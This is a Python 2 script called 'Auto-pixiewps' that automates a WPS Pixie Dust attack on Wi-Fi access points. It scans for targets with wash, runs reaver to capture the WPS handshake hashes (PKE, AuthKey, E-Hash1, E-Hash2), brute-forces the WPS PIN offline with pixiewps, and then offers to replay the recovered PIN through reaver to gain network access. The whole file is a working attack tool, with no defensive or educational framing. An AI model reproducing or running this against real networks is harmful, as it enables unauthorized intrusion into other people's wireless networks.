#!/usr/bin/python
import time
from subprocess import Popen
from subprocess import call
import os
import signal
import re
import sys


def wash(f):

	global bssid
	global channel
	bssid=[]
	channel=[]
	essid=[]
	pwr=[]
	lock=[]
	line="s"
	spacer="- "
	f.seek(0)
	
	while line:
		line = f.readline()
		if "[X]" in line:
			print line
			sys.exit("Monitor interface failed!")
		if line[:5] != "BSSID":
			if line[:5] != "-----":
				essid.append (line[84:line.find("\n")])
				bssid.append (line[:17])
				channel.append (line[22:26])
				pwr.append (line[37:41])
				lock.append (line[64:69])
	os.system('clear')
	for x in range(0,len(bssid)-1):
		if x == 0:print "Press CTRL+C to stop scan and choose accesspoint"
		if x > 8:spacer="-"
		if "Y" in lock[x]: print "\033[1;31;40m", x+1,spacer, "-b:",bssid[x], " -c:", channel[x], "Pwr", pwr[x], "-e:", essid[x]
		if "N" in lock[x]: print "\033[1;32;40m", x+1,spacer, "-b:",bssid[x], " -c:", channel[x], "Pwr", pwr[x], "-e:", essid[x]



print "\033[1;32;40m"
os.system('clear')
print "Auto-pixiewps /NxXxU"
print
print "1. Manual input"
print "2. scan networks with Wash"
manorauto = raw_input("Option:")
interface = raw_input("Select interface (mon0 for example):")

if manorauto == "2":
	fWashOut = open("fWashOut.txt", "w")
	fWashError = open("fWashError.txt", "w")
	pidW = Popen(["wash", "-i", interface], stdout=fWashOut, stderr=fWashError).pid
	f = open('fWashOut.txt')
	try:
		while True:
			wash(f)
			time.sleep(0.2)
	except KeyboardInterrupt:
		print "\033[1;32;40m"
	choose = raw_input("accesspoint:")
	if choose == "0":
		os.remove("fWashOut.txt")
		os.remove("fWashError.txt")
		sys.exit("Exit")
	choose=int(choose)
	bssid=bssid[choose-1]
	channel=channel[choose-1]
	channel.replace(" ", "")
	f.close()
	os.remove("fWashOut.txt")
	os.remove("fWashError.txt")


if manorauto == "1":
	channel = raw_input("Channel:")
	bssid = raw_input("BSSID:")

WPSpin=""
PKE=""
EHash1=""
EHash2=""
AuthKey=""
PKEb=""
EHash1b=""
EHash2b=""
AuthKeyb=""



fin = open("fReaverIn.txt", "w")
fout = open("fReaverOut.txt", "w")
ferr = open("fReaverErrors.txt", "w")

pid = Popen(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv", "-S"], stdin=fin, stdout=fout, stderr=ferr).pid

print "Retrieving hashes!"
f = open('fReaverOut.txt')
 
done="false"
while done == "false":
	line = f.readline()
	if "Waiting for beacon" in line:print "Waiting for beacon"
	if "Associated with" in line:print line[4:]
	if "PKE:" in line and PKEb == "":
		print "PKE hash found!"
		PKEb="1"
	if "AuthKey:" in line and AuthKeyb == "":
		print "AuthKey hash found!"
		AuthKeyb="1"
	if "E-Hash1" in line and EHash1b == "":
		print "E-Hash1 hash found!"
		EHash1b="1"
	if "E-Hash2" in line:
		os.kill(pid, signal.SIGQUIT)
		print "E-Hash2 found!"
		done = "true"

line="s"
f.seek(0)
while line:
    
    line = f.readline()
    if "PKE:" in line:PKE=line
    if "E-Hash1" in line:EHash1=line
    if "E-Hash2" in line:EHash2=line
    if "AuthKey" in line:AuthKey=line
f.close()

os.remove("fReaverErrors.txt")
os.remove("fReaverIn.txt")
os.remove("fReaverOut.txt")

PKE=PKE[PKE.find("PKE:")+5:PKE.find("\n")]
EHash1=EHash1[EHash1.find("EHash1:")+14:EHash1.find("\n")]
EHash2=EHash2[EHash2.find("EHash2:")+14:EHash2.find("\n")]
AuthKey=AuthKey[AuthKey.find("AuthKey:")+9:AuthKey.find("\n")]


PKEb=len(re.sub('[^A-Za-z0-9]+', '', PKE))/2
EHash1b=len(re.sub('[^A-Za-z0-9]+', '', EHash1))/2
EHash2b=len(re.sub('[^A-Za-z0-9]+', '', EHash2))/2
AuthKeyb=len(re.sub('[^A-Za-z0-9]+', '', AuthKey))/2
print
print "PKE:", PKEb, "bits"
print "E-Hash1:", EHash1b, "bits"
print "E-Hash2:", EHash2b, "bits"
print "AuthKey:", AuthKeyb, "bits"
if PKEb == 192 and EHash1b == 32 and EHash2b == 32 and AuthKeyb == 32:
	print
	print "Hashes seems to be right!"
	print "using pixiewps to try and bruteforce the pin."
else:
	print
	print "Something fishy with the hashes."
	print "using pixiewps to try and bruteforce the pin anyway."

fin2 = open("fPixiewpsIn.txt", "w")
fout2 = open("fPixiewpsOut.txt", "w")
ferr2 = open("fPixiewpsErrors.txt", "w")


runpixie=Popen(["pixiewps", "-e", PKE, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-S"],stdin=fin2, stdout=fout2, stderr=ferr2)
Popen.wait(runpixie)

f = open('fPixiewpsOut.txt')
line="s"
while line:
	line = f.readline()
	if "WPS pin:" in line:WPSpin=line
	if "WPS pin not found!" in line:WPSpin="WPS pin not found!"
f.close()


os.remove("fPixiewpsErrors.txt")
os.remove("fPixiewpsIn.txt")
os.remove("fPixiewpsOut.txt")

if WPSpin=="WPS pin not found!":
	print
	print WPSpin
else:
	WPSpin=WPSpin[WPSpin.find("WPS pin")+9:WPSpin.find("\n")]
	print
	print "WPS pin found!"
	print "Wps pin:", WPSpin
	print
	print
	useReaver = raw_input("Run this pin trough reaver on the Accesspoint? (y/N):")
	if useReaver=="y" or useReaver=="Y":
		WPSpin="--pin=%s" % (WPSpin)
		call(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv", "-S", WPSpin])
		print
		print "^ hope it worked"

print
print
print
print





